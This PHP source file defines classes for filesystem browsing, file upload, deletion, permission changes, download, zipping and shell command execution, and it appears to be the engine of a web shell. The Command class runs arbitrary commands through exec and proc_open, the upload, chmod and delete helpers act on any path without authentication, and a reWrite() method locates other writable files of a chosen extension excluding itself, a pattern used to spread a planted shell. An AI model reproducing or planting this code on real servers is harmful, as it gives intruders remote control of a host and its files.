<?php

class FileSystem
{
    protected $path;
    protected $result = null;

    function __construct($path) {
        $this->path = $path;
    }

    public function MySelf()
    {
        return $_SERVER['PHP_SELF'];
    }

    public function root()
    {
        return $_SERVER['DOCUMENT_ROOT'];
    }

    public function getPath()
    {
        return str_replace('\\', DIRECTORY_SEPARATOR, $this->path);
    }

    public function isDir($dir)
    {
        return  is_dir($dir);
    }

    public function isFile($file)
    {
        return is_file($file);
    }

    public function scDir()
    {
        return scandir($this->path);
    }

    public static function cd($directory)
    {
        return chdir($directory);
    }

    public function getExtension($filename)
    {
        return strtolower(pathinfo($filename, PATHINFO_EXTENSION));
    }

    public static function hex(string $string)
    {
        $str = "";
        for ($i=0; $i < strlen($string) ; $i++) { 
            $str .= dechex(ord($string[$i]));
        } return $str;
    }

    public static function unhex($hex)
    {
        $unhex = "";
        for ($i=0; $i < strlen($hex)-1 ; $i+=2) { 
            $unhex .= chr(hexdec($hex[$i].$hex[$i+1]));
        } return $unhex;
    }

    public function getIcon($filename, $type)
    {
        switch ($type) {
            case 'dir':
            return "https://image.flaticon.com/icons/svg/715/715676.svg";
            break;
            
            case 'file':
            switch ($this->getExtension($filename)) {
                case 'php1':
                case 'php2':
                case 'php3':
                case 'php4':
                case 'php5':
                case 'php6':
                case 'phtml':
                case 'php':
                return 'https://www.flaticon.com/svg/static/icons/svg/2306/2306154.svg';
                break;
                case 'html':
                case 'htm':
                return 'https://www.flaticon.com/svg/static/icons/svg/2306/2306098.svg';
                break;
                case 'css':
                return 'https://www.flaticon.com/svg/static/icons/svg/2306/2306041.svg';
                break;
                case 'js':
                return 'https://www.flaticon.com/svg/static/icons/svg/2306/2306122.svg';
                break;
                case 'json':
                return 'https://image.flaticon.com/icons/svg/136/136525.svg';
                break;
                case 'xml':
                return 'https://www.flaticon.com/svg/static/icons/svg/2306/2306209.svg';
                break;
                case 'py':
                return 'https://www.flaticon.com/svg/static/icons/svg/2721/2721287.svg';
                break;
                case 'zip':
                return 'https://www.flaticon.com/svg/static/icons/svg/2306/2306214.svg';
                break;
                case 'rar':
                return 'https://www.flaticon.com/svg/static/icons/svg/2306/2306170.svg';
                break;
                case 'htaccess':
                return 'https://image.flaticon.com/icons/png/128/1720/1720444.png';
                break;
                case 'txt':
                return 'https://www.flaticon.com/svg/static/icons/svg/2306/2306185.svg';
                break;
                case 'ini':
                return 'https://image.flaticon.com/icons/svg/1126/1126890.svg';
                break;
                case 'mp3':
                return 'https://www.flaticon.com/svg/static/icons/svg/2306/2306139.svg';
                break;
                case 'mp4':
                return 'https://www.flaticon.com/svg/static/icons/svg/2306/2306142.svg';
                break;
                case 'log':
                case 'log1':
                case 'log2':
                return 'https://www.flaticon.com/svg/static/icons/svg/2306/2306124.svg';
                break;
                case 'psd':
                return 'https://www.flaticon.com/svg/static/icons/svg/2306/2306166.svg';
                break;
                case 'dat':
                return 'https://www.flaticon.com/svg/static/icons/svg/2306/2306050.svg';
                break;
                case 'exe':
                return 'https://www.flaticon.com/svg/static/icons/svg/2306/2306085.svg';
                break;
                case 'apk':
                return 'https://www.flaticon.com/svg/static/icons/svg/2306/2306016.svg';
                break;
                case 'yaml':
                return 'https://cdn1.iconfinder.com/data/icons/hawcons/32/698694-icon-103-document-file-yml-512.png';break;
                case 'xlsx':
                return 'https://www.flaticon.com/svg/static/icons/svg/2306/2306200.svg';
                break;
                case 'bak':
                return 'https://image.flaticon.com/icons/svg/2125/2125736.svg';
                break;
                case 'ico':
                return 'https://www.flaticon.com/svg/static/icons/svg/2306/2306102.svg';
                break;
                case 'png':
                return 'https://www.flaticon.com/svg/static/icons/svg/2306/2306156.svg';
                break;
                case 'jpg':
                case 'webp':
                return 'https://www.flaticon.com/svg/static/icons/svg/2306/2306117.svg';
                break;
                case 'jpeg':
                return 'https://www.flaticon.com/svg/static/icons/svg/2306/2306114.svg';
                break;
                case 'svg':
                return 'https://www.flaticon.com/svg/static/icons/svg/2306/2306179.svg';
                break;
                case 'gif':
                return 'https://www.flaticon.com/svg/static/icons/svg/2306/2306094.svg';
                break;
                case 'pdf':
                return 'https://www.flaticon.com/svg/static/icons/svg/2306/2306145.svg';
                break;
                case 'asp':
                return "https://www.flaticon.com/svg/static/icons/svg/2306/2306019.svg";
                break;
                case 'doc':
                return "https://www.flaticon.com/svg/static/icons/svg/2306/2306060.svg";
                break;
                case 'docx':
                return "https://www.flaticon.com/svg/static/icons/svg/2306/2306065.svg";
                break;
                case 'otf':
                return "https://www.flaticon.com/svg/static/icons/svg/2306/2306149.svg";
                break;
                case 'ttf':
                return "https://www.flaticon.com/svg/static/icons/svg/2306/2306182.svg";
                break;
                case 'wav':
                return "https://www.flaticon.com/svg/static/icons/svg/2306/2306188.svg";
                break;
                case 'sql':
                return "https://www.flaticon.com/svg/static/icons/svg/2306/2306173.svg";
                break;
                case 'csv':
                return "https://www.flaticon.com/svg/static/icons/svg/2306/2306046.svg";
                break;
                case 'bat':
                return "https://www.flaticon.com/svg/static/icons/svg/2306/2306025.svg";
                break;
                default:
                return 'https://image.flaticon.com/icons/svg/833/833524.svg';
                break;
            }
            break;
        }
    }

    public function FileRecursive($dir, &$results = array())
    {
        $files = scandir($dir);
        foreach($files as $key => $value){
            $path = realpath($dir.DIRECTORY_SEPARATOR.$value);
            if($this->isDir($path) == false) {
                $results[] = $path;
            }
            else if($value != "." && $value != "..") {
                $this->FileRecursive($path, $results);
                if($this->isFile($path) == false) {
                    $results[] = $path;
                }   
            }
        }
        return $results;
    }

    public function reWrite($dir, $extension, $data = null)
    {
        if ($this->isWritable($dir)) {
            foreach ($this->FileRecursive($dir) as $key => $value) {
                switch ($this->getExtension($value)) {
                    case $extension:
                    if (preg_match('/' . basename($value) . "$/i", $this->MySelf(), $matches) == 0) {
                        return $value;
                    }
                    break;
                }
            }
        }
    }

    public function wr($filename, $perms)
    {
        if (is_writable($filename)) {
            print("<font color='green'>{$perms}</font>");
        } else {
            print("<font color='red'>{$perms}</font>");
        }
    }

    public function perms($filename)
    {
        $perms = @fileperms($filename);

        switch ($perms & 0xF000) {
            case 0xC000: // socket
            $info = 's';
            break;
            case 0xA000: // symbolic link
            $info = 'l';
            break;
            case 0x8000: // regular
            $info = 'r';
            break;
            case 0x6000: // block special
            $info = 'b';
            break;
            case 0x4000: // directory
            $info = 'd';
            break;
            case 0x2000: // character special
            $info = 'c';
            break;
            case 0x1000: // FIFO pipe
            $info = 'p';
            break;
            default: // unknown
            $info = 'u';
        }

        // Owner
        $info .= (($perms & 0x0100) ? 'r' : '-');
        $info .= (($perms & 0x0080) ? 'w' : '-');
        $info .= (($perms & 0x0040) ?
            (($perms & 0x0800) ? 's' : 'x' ) :
            (($perms & 0x0800) ? 'S' : '-'));

        // Group
        $info .= (($perms & 0x0020) ? 'r' : '-');
        $info .= (($perms & 0x0010) ? 'w' : '-');
        $info .= (($perms & 0x0008) ?
            (($perms & 0x0400) ? 's' : 'x' ) :
            (($perms & 0x0400) ? 'S' : '-'));

        // World
        $info .= (($perms & 0x0004) ? 'r' : '-');
        $info .= (($perms & 0x0002) ? 'w' : '-');
        $info .= (($perms & 0x0001) ?
            (($perms & 0x0200) ? 't' : 'x' ) :
            (($perms & 0x0200) ? 'T' : '-'));

        return $info;
    }

    public function getFileSize($filename, $digits = 2)
    {
        if ($this->isFile($filename)) {
            $filePath = $filename;
            if (!realpath($filePath)) {
                $filePath = $this->root() . $filePath;
            }

            $fileSize = filesize($filePath);
            $frmtSize = array("TB ", "GB ", "MB ", "KB ", "B ");
            $total    = count($frmtSize);

            while ($total -- && $fileSize > 1024) {
                $fileSize /= 1024;
            } return round($fileSize, $digits) . " " . $frmtSize[$total];
        } return false;
    }

    public function countDir($directory)
    {
        $dir = @opendir($directory);
        $c = 0;
        while (($file = readdir($dir)) !== false)
            if (!in_array($file, array('.', '..')))
                $c++;
            closedir($dir);
            return $c;
        }

        public function pwd() {
            $dir = preg_split("/(\\\|\/)/", getcwd());
            foreach ($dir as $key => $value) {
                if($value=='' && $key==0) {
                    echo '<a href="?x=2f">/</a>';
                }
                if($value == '') { 
                    continue;
                }
                echo '<a href="?x=';
                for ($i = 0; $i <= $key; $i++) {
                    echo FileSystem::hex($dir[$i]); 
                    if($i != $key) {
                        echo '2f';
                    }
                }
                print('">'.$value.'</a>/');
            }
        }


        public function getFileTime($filename)
        {
            return date("d-m-Y H:i:s", filemtime($filename));
        }

        public function Dir()
        {
            $this->result = [];
            foreach ($this->scDir() as $key => $value) {
                $filename = [
                    "pathName"      => $this->path . DIRECTORY_SEPARATOR . $value,
                    "singlePath"    => $value,
                    "filePerms"     => $this->perms($value),
                    "fileTime"      => $this->getFileTime($value),
                    "getSize"       => $this->isDir($value) ? $this->countDir($value) : false,
                    "modeChmod"     => substr(sprintf("%o", fileperms($value)), -4),
                    "getIcon"       => $this->isDir($value) ? $this->getIcon($value, "dir") : false
                ];
                if (!$this->isDir($filename['pathName']) || $value === '.' || $value === '..') continue;
                $this->result[] = $filename;
            } return $this->result;
        }

        public function File()
        {
            $this->result = [];
            foreach ($this->scDir() as $key => $value) {
                $filename = [
                    "pathName"      => $this->path . DIRECTORY_SEPARATOR . $value,
                    "singlePath"    => $value,
                    "filePerms"     => $this->perms($value),
                    "fileTime"      => $this->getFileTime($value),
                    "getSize"       => $this->isFile($value) ? $this->getFileSize($value) : false,
                    "modeChmod"     => substr(sprintf("%o", fileperms($value)), -4),
                    "getIcon"       => $this->isFile($value) ? $this->getIcon($value, "file") : false
                ];
                if (!$this->isFile($filename['pathName']) || $value === '.' || $value === '..') continue;
                $this->result[] = $filename;
            } return $this->result;
        }

    }

/**
 * 
 */
class Tools extends FileSystem
{

    function __construct(protected $path)
    {
        
    }

    public function Zip($source)
    {
        $result = (@opendir($source) === false ? false : true);
        $rootPath = realpath($source);
        $zip = new ZipArchive();
        $zipfilename = date("d-m-Y") . "-" . basename($source) . ".zip";
        $zip->open($zipfilename, ZipArchive::CREATE | ZipArchive::OVERWRITE );

        if ($result !== false) {
            $files = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($rootPath), RecursiveIteratorIterator::LEAVES_ONLY);

            foreach ($files as $name => $file) {
                if (!$file->isDir()) {
                    $filePath = $file->getRealPath();
                    $relativePath = substr($filePath, strlen($rootPath) + 1);
                    $zip->addFile($filePath, $relativePath);
                }
            }
            $zip->close();
            return TRUE;
        } else {
            if ($this->isFile($source)) {
                $zip->addFromString(basename($source), file_get_contents($source));
            }
        }
    }
}

/**
 * 
 */
class Action extends FileSystem
{
    protected $resource;
    protected $mode;
    protected $modes = [
        'readOnly'        => 'r',
        'readWrite'       => 'r+',
        'writeOnly'       => 'w',
        'writeMaster'     => 'w+',
        'writeAppend'     => 'a',
        'readWriteAppend' => 'a+',
    ];
    
    function __construct(protected $filename,) 
    {
        parent::__construct(getcwd());
    }

    public function download()
    {
        if ($this->isFile($this->filename)) {
            header("Content-Type: application/octet-stream");
            header('Content-Transfer-Encoding: binary');
            header("Content-length: ".filesize($this->filename));
            header("Cache-Control: no-cache");
            header("Pragma: no-cache");
            header("Content-disposition: attachment; filename=\"".basename($this->filename)."\";");

            $handle = fopen($this->filename, "rb");
            while (!feof($handle)) {
                print(fread($handle, 1024*8));
                @ob_flush();
                @flush();
            }
            fclose($handle);
        }
    }

    public function chmods($mode)
    {
        if (file_exists($this->filename)) {
            chmod($this->filename, $mode);
        } else {
            return false;
        }
    }

    public function move($destinantion)
    {
        if (file_exists($this->filename)) {
            $this->renames($destinantion . DIRECTORY_SEPARATOR . $this->filename);
        } else {
            return false;
        }
    }

    public function delete()
    {
        if (is_dir($this->filename)) {
            foreach ($this->FileRecursive($this->filename) as $key => $value) {
                if ($value != "." && $value != '..') {
                    if (is_dir($this->filename)) {
                        $this->delete($this->filename . DIRECTORY_SEPARATOR . $value);
                    } else {
                        unlink($this->filename . DIRECTORY_SEPARATOR . $value);
                    }
                }
            }
            if (@rmdir($this->filename)) {
                return true;
            } else {
                return false;
            }
        } else {
            if (@unlink($this->filename)) {
                return true;
            } else {
                return false;
            }
        }
    }
    public function renames($newname)
    {
        return rename($this->filename, $this->getPath() . DIRECTORY_SEPARATOR . $newname);
    }

    // public function open($mode)
    // {
    //  if (!empty(trim($this->filename))) {
    //      $this->resource = fopen($this->filename, $this->modes[$mode]);
    //      return $this->resource;
    //  }
    // }
    public function write($data, $mode)
    {
        $this->resource = fopen($this->filename, $this->modes[$mode]);
        return (!empty($data)) ? fwrite($this->resource, $data) : false;
        fclose($this->resource);
    }

    public function read()
    {
        return htmlspecialchars(file_get_contents($this->filename));
    }

}

class Command
{
    public $escapeArgs = true;
    public $escapeCommand = false;
    public $useExec = false;
    public $captureStdErr = true;
    public $procCwd;
    public $procEnv;
    public $procOptions;
    public $nonBlockingMode;
    public $timeout;
    public $locale;
    protected $_stdIn;
    protected $_command;
    protected $_args = array();
    protected $_execCommand;
    protected $_stdOut = '';
    protected $_stdErr = '';
    protected $_exitCode;
    protected $_error = '';
    protected $_executed = false;

    public function __construct($options = null)
    {
        if (is_array($options)) {
            $this->setOptions($options);
        } elseif (is_string($options)) {
            $this->setCommand($options);
        }
    }

    public function setOptions($options)
    {
        foreach ($options as $key => $value) {
            if (property_exists($this, $key)) {
                $this->$key = $value;
            } else {
                $method = 'set'.ucfirst($key);
                if (method_exists($this, $method)) {
                    call_user_func(array($this,$method), $value);
                } else {
                    throw new \Exception("Unknown configuration option '$key'");
                }
            }
        }
        return $this;
    }

    public function setCommand($command)
    {
        if ($this->escapeCommand) {
            $command = escapeshellcmd($command);
        }
        if ($this->getIsWindows()) {
            if (isset($command[1]) && $command[1]===':') {
                $position = 1;

            } elseif (isset($command[2]) && $command[2]===':') {
                $position = 2;
            } else {
                $position = false;
            }

            if ($position) {
                $command = sprintf(
                    $command[$position - 1] . ': && cd %s && %s',
                    escapeshellarg(dirname($command)),
                    escapeshellarg(basename($command))
                );
            }
        }
        $this->_command = $command;
        return $this;
    }

    public function setStdIn($stdIn) {
        $this->_stdIn = $stdIn;
        return $this;
    }

    public function getCommand()
    {
        return $this->_command;
    }

    public function getExecCommand()
    {
        if ($this->_execCommand===null) {
            $command = $this->getCommand();
            if (!$command) {
                $this->_error = 'Could not locate any executable command';
                return false;
            }
            $args = $this->getArgs();
            $this->_execCommand = $args ? $command.' '.$args : $command;
        }
        return $this->_execCommand;
    }

    public function setArgs($args)
    {
        $this->_args = array($args);
        return $this;
    }

    public function getArgs()
    {
        return implode(' ', $this->_args);
    }

    public function addArg($key, $value = null, $escape = null)
    {
        $doEscape = $escape !== null ? $escape : $this->escapeArgs;
        $useLocale = $doEscape && $this->locale !== null;

        if ($useLocale) {
            $locale = setlocale(LC_CTYPE, 0);
            setlocale(LC_CTYPE, $this->locale);
        }
        if ($value === null) {
            $this->_args[] = $doEscape ? escapeshellarg($key) : $key;
        } else {
            if (substr($key, -1) === '=') {
                $separator = '=';
                $argKey = substr($key, 0, -1);
            } else {
                $separator = ' ';
                $argKey = $key;
            }
            $argKey = $doEscape ? escapeshellarg($argKey) : $argKey;

            if (is_array($value)) {
                $params = array();
                foreach ($value as $v) {
                    $params[] = $doEscape ? escapeshellarg($v) : $v;
                }
                $this->_args[] = $argKey . $separator . implode(' ', $params);
            } else {
                $this->_args[] = $argKey . $separator .
                    ($doEscape ? escapeshellarg($value) : $value);
            }
        }
        if ($useLocale) {
            setlocale(LC_CTYPE, $locale);
        }

        return $this;
    }

    public function getOutput($trim = true)
    {
        return $trim ? trim($this->_stdOut) : $this->_stdOut;
    }

    public function getError($trim = true)
    {
        return $trim ? trim($this->_error) : $this->_error;
    }

    public function getStdErr($trim = true)
    {
        return $trim ? trim($this->_stdErr) : $this->_stdErr;
    }

    public function getExitCode()
    {
        return $this->_exitCode;
    }

    public function getExecuted()
    {
        return $this->_executed;
    }

    public function execute()
    {
        $command = $this->getExecCommand();

        if (!$command) {
            return false;
        }

        if ($this->useExec) {
            $execCommand = $this->captureStdErr ? "$command 2>&1" : $command;
            exec($execCommand, $output, $this->_exitCode);
            $this->_stdOut = implode("\n", $output);
            if ($this->_exitCode !== 0) {
                $this->_stdErr = $this->_stdOut;
                $this->_error = empty($this->_stdErr) ? 'Command failed' : $this->_stdErr;
                return false;
            }
        } else {
            $isInputStream = $this->_stdIn !== null &&
                is_resource($this->_stdIn) &&
                in_array(get_resource_type($this->_stdIn), array('file', 'stream'));
            $isInputString = is_string($this->_stdIn);
            $hasInput = $isInputStream || $isInputString;
            $hasTimeout = $this->timeout !== null && $this->timeout > 0;

            $descriptors = array(
                1   => array('pipe','w'),
                2   => array('pipe', $this->getIsWindows() ? 'a' : 'w'),
            );
            if ($hasInput) {
                $descriptors[0] = array('pipe', 'r');
            }

            $nonBlocking = $this->nonBlockingMode === null ?
                !$this->getIsWindows() : $this->nonBlockingMode;

            $startTime = $hasTimeout ? time() : 0;
            $process = proc_open($command, $descriptors, $pipes, $this->procCwd, $this->procEnv, $this->procOptions);

            if (is_resource($process)) {

                if ($nonBlocking) {
                    stream_set_blocking($pipes[1], false);
                    stream_set_blocking($pipes[2], false);
                    if ($hasInput) {
                        $writtenBytes = 0;
                        $isInputOpen = true;
                        stream_set_blocking($pipes[0], false);
                        if ($isInputStream) {
                            stream_set_blocking($this->_stdIn, false);
                        }
                    }
                    $isRunning = true;
                    while ($isRunning) {
                        $status = proc_get_status($process);
                        $isRunning = $status['running'];
                        if ($isRunning && $hasInput && $isInputOpen) {
                            if ($isInputStream) {
                                $written = stream_copy_to_stream($this->_stdIn, $pipes[0], 16 * 1024, $writtenBytes);
                                if ($written === false || $written === 0) {
                                    $isInputOpen = false;
                                    fclose($pipes[0]);
                                } else {
                                    $writtenBytes += $written;
                                }
                            } else {
                                if ($writtenBytes < strlen($this->_stdIn)) {
                                    $writtenBytes += fwrite($pipes[0], substr($this->_stdIn, $writtenBytes));
                                } else {
                                    $isInputOpen = false;
                                    fclose($pipes[0]);
                                }
                            }
                        }

                        while (($out = fgets($pipes[1])) !== false) {
                            $this->_stdOut .= $out;
                        }
                        while (($err = fgets($pipes[2])) !== false) {
                            $this->_stdErr .= $err;
                        }

                        $runTime = $hasTimeout ? time() - $startTime : 0;
                        if ($isRunning && $hasTimeout && $runTime >= $this->timeout) {
                            proc_terminate($process);
                        }

                        if (!$isRunning) {
                            $this->_exitCode = $status['exitcode'];
                            if ($this->_exitCode !== 0 && empty($this->_stdErr)) {
                                if ($status['stopped']) {
                                    $signal = $status['stopsig'];
                                    $this->_stdErr = "Command stopped by signal $signal";
                                } elseif ($status['signaled']) {
                                    $signal = $status['termsig'];
                                    $this->_stdErr = "Command terminated by signal $signal";
                                } else {
                                    $this->_stdErr = 'Command unexpectedly terminated without error message';
                                }
                            }
                            fclose($pipes[1]);
                            fclose($pipes[2]);
                            proc_close($process);
                        } else {
                            usleep(10000);
                        }
                    }
                } else {
                    if ($hasInput) {
                        if ($isInputStream) {
                            stream_copy_to_stream($this->_stdIn, $pipes[0]);
                        } elseif ($isInputString) {
                            fwrite($pipes[0], $this->_stdIn);
                        }
                        fclose($pipes[0]);
                    }
                    $this->_stdOut = stream_get_contents($pipes[1]);
                    $this->_stdErr = stream_get_contents($pipes[2]);
                    fclose($pipes[1]);
                    fclose($pipes[2]);
                    $this->_exitCode = proc_close($process);
                }

                if ($this->_exitCode !== 0) {
                    $this->_error = $this->_stdErr ?
                        $this->_stdErr :
                        "Failed without error message: $command (Exit code: {$this->_exitCode})";
                    return false;
                }
            } else {
                $this->_error = "Could not run command $command";
                return false;
            }
        }

        $this->_executed = true;

        return true;
    }

    public function getIsWindows()
    {
        return strncasecmp(PHP_OS, 'WIN', 3)===0;
    }

    public function __toString()
    {
        return (string) $this->getExecCommand();
    }
}

/**
 * 
 */
class multiUpload extends FileSystem
{
    
    function __construct(protected $source, protected $pathUpload = null,)
    {
        parent::__construct(getcwd());
    }

    public function pathUpload($pathUpload)
    {
        return $this->pathUpload = $pathUpload;
    }

    public function execute()
    {
        $files = count($this->source['tmp_name']);
        for ($i=0; $i < $files ; $i++) { 
            $data = copy($this->source['tmp_name'][$i], $this->pathUpload . DIRECTORY_SEPARATOR . $this->source['name'][$i]);
            if ($data) {
                $dataJson = array(
                    "fileName" => $this->source['name'][$i],
                    "fileSize" => $this->source['size'][$i],
                    "fileType" => $this->source['type'][$i],
                    "filePath" => $this->pathUpload
                );
                print json_encode($dataJson);
            } else {
                print json_encode($this->source['error'][$i]);
            }
        }
    }
}
